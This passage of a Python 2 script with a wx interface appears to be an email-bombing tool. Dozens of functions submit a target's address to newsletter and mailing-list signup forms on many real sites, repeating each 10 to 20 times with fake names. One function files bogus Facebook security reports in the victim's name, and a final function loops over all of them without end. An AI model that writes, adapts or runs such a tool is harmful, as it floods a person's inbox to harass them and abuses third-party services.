            Publisher().sendMessage("update",  "New Email Sent with http://www.hc-sc.gc.ca/ahc-asc/media/sub-abonn/index-eng.php")
            wx.MutexGuiLeave()
        except:
            pass
def bounty(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.naturalnews.com/ReaderRegistration1.asp','Email='+email.replace('@','%40')+'&imageField.x=80&imageField.y=12&ImageCode=16789&TopicsAll=1&affiliate=ReaderReg')
            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.naturalnews.com/ReaderRegistration1.asp")

            wx.MutexGuiLeave()
        except:
            pass
def publis(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.publishersweekly.com/pw/email%2Dsubscriptions/index.html?submitting=1&lstatus=loggedout&email='+email.replace('@','%40')+'&1397d47954=on&5db9337072=on&68597ae6fb=on&0f4bd0fb05=on&a865c5019d=on&fd5c33daf6=on&x=38&y=6','nothing')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.publishersweekly.com/")
            wx.MutexGuiLeave()
        except:
            pass
def IOSS(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://cmsmisc.indiatimes.com/MailRegistration/register.aspx','txt_Name=raptoro&txt_ID='+email.replace('@','%40')+'&txt_SID=9&redirecturl=http%3A%2F%2Ftimesofindia.indiatimes.com%2Fsubscription.cms&failureurl=http%3A%2F%2Ftimesofindia.indiatimes.com%2Fsubscription.cms&S1=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://cmsmisc.indiatimes.com/")
            wx.MutexGuiLeave()
        except:
            pass

def clickz(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://newsletters.clickz.com/s/','_account_id=363&_table_id=1&_dedupe=1&_email_field=1.email&_static_update=1&_send_dupe=1&_send_copy=1&_rp=form%3A26&_copy_campaign_id=11706&_copy_launch_id=11186&Input='+email.replace('@','%40')+'&1.email='+email.replace('@','%40')+'&2.clickz_experts_today_newsletter=True&2.clickz_weekly_newsletter=True&2.clickz_events_newsletter=True&2.clickz_email_newsletter=True&2.clickz_analytics_newsletter=True&2.clickz_marketing_newsletter=True&2.clickz_media_newsletter=True&2.clickz_mobile_newsletter=True&2.clickz_search_newsletter=True&2.clickz_social_newsletter=True&2.clickz_news_newsletter=True&2.clickz_stats_newsletter=True&2.clickz_facebook_newsletter=True&2.clickz_politics_newsletter=True&2.clickz_features_newsletter=True&2.clickz_asia_today_newsletter=True&2.clickz_asia_weekly_newsletter=True&2.sew_searchday_newsletter=True&2.sew_searchweek_newsletter=True&2.ses_events_newsletter=True&2.webcast_alerts_newsletter=True&submit=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://newsletters.clickz.com/s/")
            wx.MutexGuiLeave()
        except:
            pass
def cream(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://newsletters.creamermedia.co.za/public/subscription','form_id=245&contact_title=&contact_name=&contact_lastname=&contact_email='+email.replace('@','%40')+'&contact_mobile=&contact_telephone_office=&contact_telephone_fax=&contact_company_name=&contact_company_position=&contact_industry=&list_id%5B%5D=17&list_id%5B%5D=4551&list_id%5B%5D=18&list_id%5B%5D=12241&list_id%5B%5D=14&list_id%5B%5D=12238&list_id%5B%5D=12383&list_id%5B%5D=19&list_id%5B%5D=15&list_id%5B%5D=12220&op=subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://newsletters.creamermedia.co.za/public/subscription")
            wx.MutexGuiLeave()
        except:
            pass
def cali(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://newsletters.creamermedia.co.za/public/subscription','mailchimp_lists%5Bf8ac4352ca%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5Bf8ac4352ca%5D%5BNAME%5D=roberto&mailchimp_lists%5Bf8ac4352ca%5D%5BORGANIZATI%5D=arch&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE3%5D=gonzales&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE4%5D=roberto&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE5%5D=&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE6%5D=&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE7%5D=&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE8%5D=&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE9%5D=&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE10%5D=&mailchimp_lists%5Bf8ac4352ca%5D%5BMMERGE11%5D=&mailchimp_lists%5B3ca86f1a0d%5D%5Binterest_groups_3ca86f1a0d%5D%5B30%5D%5Bfaculty%2C+deans%2C+and+administrators.%5D=faculty%2C+deans%2C+and+administrators.&mailchimp_lists%5B3ca86f1a0d%5D%5Binterest_groups_3ca86f1a0d%5D%5B30%5D%5Blaw+librarians.%5D=law+librarians.&mailchimp_lists%5B3ca86f1a0d%5D%5Binterest_groups_3ca86f1a0d%5D%5B30%5D%5Binformation+technologists+%28IT%29.%5D=information+technologists+%28IT%29.&mailchimp_lists%5B3ca86f1a0d%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5B3ca86f1a0d%5D%5BFNAME%5D=&mailchimp_lists%5B3ca86f1a0d%5D%5BLNAME%5D=&mailchimp_lists%5B3ca86f1a0d%5D%5BSCHOOL%5D=&mailchimp_lists%5B4817229b67%5D%5Binterest_groups_4817229b67%5D%5B45%5D%5BFree+Online+Courses%5D=Free+Online+Courses&mailchimp_lists%5B4817229b67%5D%5Binterest_groups_4817229b67%5D%5B45%5D%5BLaw+School+Tech+Talk%5D=Law+School+Tech+Talk&mailchimp_lists%5B4817229b67%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5B4817229b67%5D%5BFNAME%5D=&mailchimp_lists%5B4817229b67%5D%5BLNAME%5D=&mailchimp_lists%5B4817229b67%5D%5BORGANIZATI%5D=&mailchimp_lists%5B4817229b67%5D%5BMMERGE4%5D=&mailchimp_lists%5B4817229b67%5D%5BMMERGE5%5D=&mailchimp_lists%5B4817229b67%5D%5BMMERGE6%5D=&mailchimp_lists%5B4fd9ee602d%5D%5Binterest_groups_4fd9ee602d%5D%5B26%5D%5BNew+lessons+only%2C+as+released.%5D=New+lessons+only%2C+as+released.&mailchimp_lists%5B4fd9ee602d%5D%5Binterest_groups_4fd9ee602d%5D%5B26%5D%5BNew+AND+updated+lessons%2C+weekly.%5D=New+AND+updated+lessons%2C+weekly.&mailchimp_lists%5B4fd9ee602d%5D%5Binterest_groups_4fd9ee602d%5D%5B26%5D%5BNew+blog+posts+only%2C+as+released.%5D=New+blog+posts+only%2C+as+released.&mailchimp_lists%5B4fd9ee602d%5D%5Binterest_groups_4fd9ee602d%5D%5B26%5D%5BEverything+%28new+blog+posts+%26+lessons%29+as+released.%5D=Everything+%28new+blog+posts+%26+lessons%29+as+released.&mailchimp_lists%5B4fd9ee602d%5D%5Binterest_groups_4fd9ee602d%5D%5B26%5D%5BEverything+%28new+blog+posts+%26+lessons%29+weekly.%5D=Everything+%28new+blog+posts+%26+lessons%29+weekly.&mailchimp_lists%5B4fd9ee602d%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5B4fd9ee602d%5D%5BFNAME%5D=&mailchimp_lists%5B4fd9ee602d%5D%5BLNAME%5D=&mailchimp_lists%5B4fd9ee602d%5D%5BORGANIZATI%5D=&mailchimp_lists%5Bd1a0160dc5%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5Bd1a0160dc5%5D%5BFNAME%5D=&mailchimp_lists%5Bd1a0160dc5%5D%5BLNAME%5D=&mailchimp_lists%5Bd1a0160dc5%5D%5BSCHOOL%5D=&mailchimp_lists%5B0e3cbbbd4b%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5B0e3cbbbd4b%5D%5BFNAME%5D=&mailchimp_lists%5B0e3cbbbd4b%5D%5BLNAME%5D=&mailchimp_lists%5B0e3cbbbd4b%5D%5BORGANIZATI%5D=&form_build_id=form-c7f12f404ae48b87dcfaa7df5b5632c0&form_id=mailchimp_subscribe_anon_form_all&op=Sign+Up%21')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.cali.org/mailchimp/subscribe")
            wx.MutexGuiLeave()
        except:
            pass
def etett(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://cmsmisc.indiatimes.com/mailregistration/register.aspx','Market=7&Daily=2&Weekly=1&ETWealth=28&IPO=29&txt_Name=roberto&txt_ID='+email.replace('@','%40')+'&txt_SID=29%2C28%2C7%2C1%2C2&redirecturl=http%3A%2F%2Feconomictimes.indiatimes.com%2Fsubscription.cms&S1=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://cmsmisc.indiatimes.com/mailregistration/register.aspx")
            wx.MutexGuiLeave()
        except:
            pass
def myvoice(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://globalvoicesonline.org/subscribe/#mc_signup','mc_submit_type=html&mcsf_action=mc_submit_signup_form&_mc_submit_signup_form_nonce=e1f18cdd21&mc_mv_EMAIL='+email.replace('@','%40')+'&mc_mv_FNAME=&mc_mv_LNAME=&mc_mv_MMERGE3=&mc_mv_MMERGE8=&group%5B5433%5D=Daily+Digest&mc_signup_submit=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://globalvoicesonline.org/subscribe/#mc_signup")

            wx.MutexGuiLeave()
        except:
            pass
def core77(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://core77.cmail1.com/.aspx/s/80940/','cm-80940-80940='+email.replace('@','%40')+'&subscribe=SUBSCRIBE')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://core77.cmail1.com/.aspx/s/80940/")
            wx.MutexGuiLeave()
        except:
            pass

def mondediplo(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://mondediplo.com/','-----------------------------5091538381461268580880574032\r\nContent-Disposition: form-data; name="var_ajax"\r\n\r\nform\r\n-----------------------------5091538381461268580880574032\r\nContent-Disposition: form-data; name="formulaire_action"\r\n\r\nmailmansub\r\n-----------------------------5091538381461268580880574032\r\nContent-Disposition: form-data; name="formulaire_action_args"\r\n\r\nuAVN9aiKaX0o5TCuo2OUwTB15t0UkbDFmAB14XMB8fjhYai6lr+YbWiJ6GH8AE0hHd5lxBGN1orBSAGNuxIp+3glEO/CqcJkk57e5fw8FG7RkoWki5BnHZO5zQmiwQK0U0AShOYXenLGfxv07guJoeBrqs0kw7p8M5Y006Uosu5wwUo=\r\n-----------------------------5091538381461268580880574032\r\nContent-Disposition: form-data; name="email"\r\n\r\n'+email.replace('@','%40')+'\r\n-----------------------------5091538381461268580880574032\r\nContent-Disposition: form-data; name="opt"\r\n\r\nsub\r\n-----------------------------5091538381461268580880574032--\r\n')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://mondediplo.com/")
            wx.MutexGuiLeave()
        except:
            pass

def statee(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.newstatesman.com/?nocache=1','cmail='+email.replace('@','%40')+'&action=subscribe&op=Save&form_build_id=form-dc113816bf84a32dda18c68e04ad1fef&form_id=simplenews_block_form_4162')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.newstatesman.com/?nocache=1")
            wx.MutexGuiLeave()
        except:
            pass
def wordi(email):
    for a in xrange(10):
        try:
            br = createbrowser('https://subscribe.wordpress.com/','email='+email.replace('@','%40')+'&action=subscribe&blog_id=10480236&source=http%3A%2F%2Fteamtrev.com%2F2010%2F08%2F09%2Fsubscribe-to-our-blog-and-receive-email-updates%2F&sub-type=widget&redirect_fragment=blog_subscription-3&_wpnonce=5de962c6b7')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://subscribe.wordpress.com/")
            wx.MutexGuiLeave()
        except:
            pass
def wblizi(email):
    for a in xrange(10):
        try:
            br = createbrowser('https://www.feedblitz.com/f/f.fbz?AddNewUserDirect','oauth_nonce=fb87cef8-bbca-11e1-b7ce-003005d070f0&EMAIL='+email.replace('@','%40')+'&PWD=&REFERER=http%3A%2F%2Fwww.clarku.edu%2Fluminis%2Fdigests%2Fsubscribe_newsevents.htm&PUBLISHER=24099506&channelid=1&FEEDID=718651&mainform=1&email_=&email_address=&_email=&VERIFY=2e6a616d&random=24453713403016')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://www.feedblitz.com/f/f.fbz?AddNewUserDirect")
            wx.MutexGuiLeave()
        except:
            pass

def fessebook(email):
    for a in xrange(20):
        try:
            br = mechanize.Browser()
            br.set_handle_gzip(True)
            br.set_handle_robots(False)
            br.set_handle_redirect(True)
            br.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1 like Mac OS X; en-US) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3')]
            br.addheaders = [('cookie','datr=drrxT6cxbPvL97SuDf'+random.choice("1234567890")+'CYIc'+random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")+'; lsd=AVqZAgo0; reg_fb_gate=https%3A%2F%2Fwww.facebook.com%2Fwhitehat%2Freport%2F; reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2Fwhitehat%2Freport%2F; wd=1366x683; act=1341242460352%2F15%3A2; _e_1LKt_0=%5B%221LKt%22%2C1341242429743%2C%22act%22%2C1341242429710%2C2%2C%22https%3A%2F%2Fwww.facebook.com%2Fwhitehat%2Freport%2F%23%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C497%2C282%2C0%2C981%2C16%5D; _e_1LKt_1=%5B%221LKt%22%2C1341242434976%2C%22act%22%2C1341242434969%2C3%2C%22https%3A%2F%2Fwww.facebook.com%2Fwhitehat%2Freport%2F%23%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C566%2C364%2C0%2C981%2C16%5D; _e_1LKt_2=%5B%221LKt%22%2C1341242435833%2C%22act%22%2C1341242435829%2C4%2C%22https%3A%2F%2Fwww.facebook.com%2Fwhitehat%2Freport%2F%23%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C595%2C287%2C0%2C981%2C16%5D; _e_1LKt_3=%5B%221LKt%22%2C1341242438465%2C%22act%22%2C1341242438463%2C5%2C%22https%3A%2F%2Fwww.facebook.com%2Fwhitehat%2Freport%2F%23%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C690%2C343%2C0%2C981%2C16%5D; _e_1LKt_4=%5B%221LKt%22%2C1341242438862%2C%22act%22%2C1341242438858%2C6%2C%22description%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C600%2C359%2C0%2C981%2C16%5D; _e_1LKt_5=%5B%221LKt%22%2C1341242439408%2C%22act%22%2C1341242439406%2C7%2C%22description%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C600%2C349%2C0%2C981%2C16%5D; _e_1LKt_6=%5B%221LKt%22%2C1341242451225%2C%22act%22%2C1341242451217%2C9%2C%22reproducible%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C497%2C585%2C0%2C981%2C16%5D; _e_1LKt_7=%5B%221LKt%22%2C1341242451858%2C%22act%22%2C1341242451853%2C11%2C%22published%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C514%2C612%2C0%2C981%2C16%5D; _e_1LKt_8=%5B%221LKt%22%2C1341242452304%2C%22act%22%2C1341242452303%2C12%2C%22name%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C501%2C630%2C0%2C981%2C16%5D; _e_1LKt_9=%5B%221LKt%22%2C1341242455882%2C%22act%22%2C1341242455879%2C13%2C%22email%22%2C%22click%22%2C%22click%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C702%2C635%2C0%2C981%2C16%5D; _e_1LKt_10=%5B%221LKt%22%2C1341242460354%2C%22act%22%2C1341242460352%2C15%2C%22%2Fajax%2Fwhitehat%2Freport.php%22%2C%22f%22%2C%22submit%22%2C%22-%22%2C%22r%22%2C%22%2Fwhitehat%2Freport%2F%22%2C%7B%22ft%22%3A%7B%7D%2C%22gt%22%3A%7B%7D%7D%2C0%2C0%2C0%2C0%2C16%5D; x-src=%2Fajax%2Fwhitehat%2Freport.php%7Cwhitehat_report_form')]
            br.open('https://www.facebook.com/ajax/whitehat/report.php','lsd=AVqZAgo0&type=open_redirect&scope=platform&description=some%20restaurant%20application%20is%20redirecting%20to%20any%20website.&reproducible=on&published=on&name='+randomname()+'&email='+email.replace('@','%40')+'&__user=0&__a=1&fb_dtsg=AQBHvSSP&phstamp=165816672118838380237')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://www.facebook.com")
            wx.MutexGuiLeave()
        except:
            pass

def wikipedia(email):
    for a in xrange(15):
        try:
            br = createbrowser('https://lists.wikimedia.org/mailman/subscribe/daily-article-l','email='+email.replace('@','%40')+'&fullname='+randomname()+'&pw=&pw-conf=&email-button=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://lists.wikimedia.org/")
            wx.MutexGuiLeave()
        except:
            pass

def devcentral(email):
    for a in xrange(15):
        try:
            br = createbrowser('https://devcentral.f5.com/Community/NewUserRegistration/tabid/1082225/Default.aspx','-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="amcbid"\r\n\r\ncdo0z8eGfKnU7TG4HW0qKaIKizEVfqBh4Nfl5Crj/2k=\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="__EVENTTARGET"\r\n\r\n\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="__EVENTARGUMENT"\r\n\r\n\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="__VIEWSTATE"\r\n\r\n/wEPaA8FDzhjZjJhMTEwN2M5ZGUzNBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUUZG5uJGRubk5BViRjdGxkbm5OQVbqsD0riDuMSgkqYtNvN/WlVgaqnw==\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtUsername"\r\n\r\n'+randomname()+'\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtPassword"\r\n\r\nmypasswordis\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtPasswordConfirm"\r\n\r\nmypasswordis\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtDisplayName"\r\n\r\nraptorito\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtFirstName"\r\n\r\ngeorgina\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtLastName"\r\n\r\nabbouda\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtEmail"\r\n\r\n'+email+'\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$dnnctlCity"\r\n\r\nkenza\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$dnnctlRegion"\r\n\r\nArkansas\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtdnnctlRegion"\r\n\r\n\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$hiddnnctlRegion"\r\n\r\n\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$dnnctlCountry"\r\n\r\nUnited States\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$txtdnnctlCountry"\r\n\r\n\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$hiddnnctlCountry"\r\n\r\n\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$dnnctlPostalCode"\r\n\r\n23568\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="dnn$ctr1085424$Main$signup$btnNext"\r\n\r\nSign up\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="ScrollTop"\r\n\r\n580\r\n-----------------------------15038714484094478131696634028\r\nContent-Disposition: form-data; name="__dnnVariable"\r\n\r\n{"__scdoff":"1"}\r\n-----------------------------15038714484094478131696634028--\r\n')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://devcentral.f5.com/")
            wx.MutexGuiLeave()
        except:
            pass

def bruzel(email):
    for a in xrange(15):
        try:
            br = createbrowser('http://app.streamsend.com/public/KBFR/50k/subscribe','person%5Bemail_address%5D='+email.replace('@','%40')+'&person%5Bemail_content_format%5D=html&commit=Sign+Up')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://lists.wikimedia.org/")
            wx.MutexGuiLeave()
        except:
            pass
def beee(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.swarmjam.com/waf.srv/sj/sj/cn/auction_ActionPostBidder?ONSUCCESS=subscribed.jsp&ONERR1=signup.jsp&ONERR2=errmsg.jsp&ONERR4=home.jsp&_vrfkey1=v284470','_keyq=insert&_femail='+email.replace('@','%40')+'&_fsignup=&PRODCATSELECTOR=10150492&_vrfkey2=v284470')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with www.swarmjam.com/waf.srv")
            wx.MutexGuiLeave()
        except:
            pass
def dexigneur(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://list.dexigner.com/subscribe/','email='+email.replace("@","%40")+'&htmlemail=1&list%5B2%5D=signup&listname%5B2%5D=Dexigner+Newsletter&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://list.dexigner.com/subscribe/")
            wx.MutexGuiLeave()
        except:
            pass

def foundazion(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://foundationcenter.org/newsletters/newsletters_mail.cfm;jsessionid=PISZYOFI3QEH5LAQBQ4CGW15AAAACI2F','email=archlinux%40windowslive.com&email_required=Please+enter+your+e-mail+address.&emailconfirm='+email.replace('@','%40')+'&emailconfirm_required=Please+confirm+your+e-mail+address.&pndl=SUBSCRIBE&pndl=&rfpbulletin=SUBSCRIBE&rfpbulletin=&jobalert=SUBSCRIBE&jobalert=&connections=SUBSCRIBE&connections=&FCNYlib=SUBSCRIBE&FCNYlib=&FCDClib=SUBSCRIBE&FCDClib=&FCSflib=&FCCllib=SUBSCRIBE&FCCllib=&FCAtlib=SUBSCRIBE&FCAtlib=&submit=+Submit+')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://foundationcenter.org")
            wx.MutexGuiLeave()
        except:
            pass
def sourceforge(email):
    for a in xrange(10):
        try:
            br = createbrowser('https://lists.sourceforge.net/lists/subscribe/clamwin-users','email='+email.replace('@','%40')+'&fullname=roberto&pw=passwordstupid&pw-conf=passwordstupid&digest=1&email-button=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://lists.sourceforge.net/lists/subscribe/clamwin-users")
            wx.MutexGuiLeave()
        except:
            pass

def dailytrojan(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://madmimi.com/signups/subscribe/3308','signup%5Bname%5D=roberto+gonzales&signup%5Bzip%5D=85145&signup%5Bcountry%5D=usa&signup%5Bemail%5D='+email.replace('@','%40')+'&commit=Sign+Up')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://lists.sourceforge.net/lists/subscribe/clamwin-users")
            wx.MutexGuiLeave()
        except:
            pass
def tcdai(email):
    for a in xrange(15):
        try:
            br = createbrowser('http://www.tcdailyplanet.net/mailchimp/subscribe','mailchimp_lists%5B9e5232ad06%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5B9e5232ad06%5D%5BFNAME%5D=roberto&mailchimp_lists%5B9e5232ad06%5D%5BLNAME%5D=gonzales&mailchimp_lists%5Bf0b2587450%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5Bf0b2587450%5D%5BFNAME%5D=roberto&mailchimp_lists%5Bf0b2587450%5D%5BLNAME%5D=gonzales&mailchimp_lists%5Bb85111bcf0%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5Bb85111bcf0%5D%5BFNAME%5D=roberto&mailchimp_lists%5Bb85111bcf0%5D%5BLNAME%5D=gonzales&mailchimp_lists%5B26b9cee716%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5B26b9cee716%5D%5BFNAME%5D=roberto&mailchimp_lists%5B26b9cee716%5D%5BLNAME%5D=gonzales&mailchimp_lists%5Bd5dd7f1596%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5Bd5dd7f1596%5D%5BFNAME%5D=roberto&mailchimp_lists%5Bd5dd7f1596%5D%5BLNAME%5D=gonzales&mailchimp_lists%5B4788b353a4%5D%5BEMAIL%5D='+email.replace('@','%40')+'&mailchimp_lists%5B4788b353a4%5D%5BFNAME%5D=roberto&mailchimp_lists%5B4788b353a4%5D%5BLNAME%5D=gonzales&form_build_id=form-6cdc28614c5f4860ea7ba81a45d0eada&form_id=mailchimp_subscribe_anon_form_all&op=Sign+Up%21')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.tcdailyplanet.net/mailchimp/subscribe")
            wx.MutexGuiLeave()
        except:
            pass
def aphoto(email):
    for a in xrange(15):
        try:
            br = createbrowser('http://www.aphotoeditor.com/post_notification_header-2/','addr='+email.replace('@','%40')+'&submit=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.aphotoeditor.com/post_notification_header-2/")
            wx.MutexGuiLeave()
        except:
            pass
def earzik(email):
    for a in xrange(15):
        try:
            br = createbrowser('https://subscribe.wordpress.com/','email='+email.replace('@','%40')+'&action=subscribe&blog_id=12792283&source=http%3A%2F%2Fearwormery.wordpress.com%2F&sub-type=widget&redirect_fragment=blog_subscription-3&_wpnonce=45f438b842')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://subscribe.wordpress.com/")
            wx.MutexGuiLeave()
        except:
            pass
#http://earthobservatory.nasa.gov/Subscribe/index.php
def nasa(email):
    for a in xrange(15):
        try:
            br = createbrowser('http://earthobservatory.nasa.gov/Subscribe/index.php','email=archlinux%40windowslive.com&confirm_email='+email.replace('@','%40')+'&eo-announce=on&nh-announce=on&nh-weekly=on&submit=Sign+Up&EO_subscribe=send')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://earthobservatory.nasa.gov/Subscribe/index.php")
            wx.MutexGuiLeave()
        except:
            pass

import random
def randomname():
    naming=""
    mynoomber = random.randint(5,11)
    for i in xrange(mynoomber):
        if i%2==0 :
            if random.randint(0,4)==0:
                naming+=random.choice(['ch',
                'sh','ph','th','pr','ck','sr','zw','tr','kr','pl','kl','sc','dr'])
            else:
                naming+=random.choice('bcdfghjklmnpqrstvwxyz')

        else:
            naming+=random.choice('aeiou')
    return naming


def fuckginfunctions(functionlist,email):
    while(1):
        for function in functionlist:
            function(email)

#######################END  hell of functions###########################

####################THE BIG LIST###############################
